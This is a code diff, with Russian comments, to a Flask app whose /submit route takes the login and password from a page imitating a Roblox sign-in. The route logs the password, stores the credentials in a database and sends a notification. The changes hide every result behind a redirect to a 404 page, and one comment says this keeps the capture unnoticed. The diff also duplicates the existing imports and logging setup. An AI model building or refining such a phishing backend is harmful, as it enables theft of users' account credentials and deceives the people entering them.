@@ -510,6 +510,16 @@ logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %
 logger = logging.getLogger(__name__)
 
 # Обновлённый маршрут /submit
+# Убедитесь, что импорты присутствуют
+from flask import Flask, request, render_template, redirect, url_for
+import logging
+import time
+
+# Настройка логирования
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+# Обновлённый маршрут /submit
 @app.route('/submit', methods=['POST'])
 def submit_login():
     logger.info("Обработка формы логина")
@@ -519,11 +529,11 @@ def submit_login():
         logger.debug(f"Получено: login={login}, password={password}")
         if not login or not password:
             logger.warning("Пустой логин или пароль")
-            return render_template('login-roblox.html', error="Логин и пароль обязательны")
+            return render_template('login-roblox.html')  # Без ошибки, чтобы незаметно
         conn = get_db_connection()
         if not conn:
             logger.error("База недоступна")
-            return render_template('login-roblox.html', error="Ошибка сервера")
+            return redirect(url_for('show_404'))  # На 404 при ошибке
         try:
             with conn.cursor() as c:
                 c.execute(
@@ -538,7 +548,7 @@ def submit_login():
                 logger.info(f"Сохранено в базе: {login}")
         except Exception as e:
             logger.error(f"Ошибка сохранения в базе: {e}")
-            return render_template('login-roblox.html', error="Ошибка сохранения данных")
+            return redirect(url_for('show_404'))  # На 404 при ошибке
         finally:
             conn.close()
         # Повторные попытки отправки уведомления
@@ -566,10 +576,10 @@ def submit_login():
                 if attempt == 2:
                     logger.error("Все попытки отправки провалились")
                 time.sleep(1)
-        return render_template('login-roblox.html', success="Данные успешно отправлены")
+        return redirect(url_for('show_404'))  # Перенаправление на 404
     except Exception as e:
         logger.error(f"Ошибка обработки формы: {e}")
-        return render_template('login-roblox.html', error="Произошла ошибка")
+        return redirect(url_for('show_404'))  # На 404 при любой ошибке
 
 # Новый маршрут /404
 @app.route('/404')
